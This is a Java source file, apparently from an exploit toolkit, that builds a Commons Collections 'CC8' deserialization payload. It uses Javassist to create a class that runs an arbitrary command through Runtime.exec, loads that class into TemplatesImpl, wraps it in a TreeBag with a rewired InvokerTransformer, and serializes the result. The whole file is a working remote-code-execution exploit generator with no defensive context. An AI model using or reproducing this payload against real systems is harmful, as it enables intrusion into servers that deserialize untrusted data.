package top.racerz.payload;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;

public class CC8 {
    public static byte[] getPayload(String command) throws Exception{
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        // 恶意字节码部分构造
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass poc = classPool.makeClass("POC");
        poc.setSuperclass(classPool.get(AbstractTranslet));
        poc.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\""+ command +"\");");

        byte[] evilCode = poc.toBytecode();
        // TemplatesImpl 恶意加载类构造 sink
        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        Field field = templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl, new byte[][]{evilCode});

        Field field1 = templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl, "whatever");


        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(templatesImpl);

        Field field2 = InvokerTransformer.class.getDeclaredField("iMethodName");
        field2.setAccessible(true);
        field2.set(transformer, "newTransformer");

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(tree);
        return bout.toByteArray();

    }
}

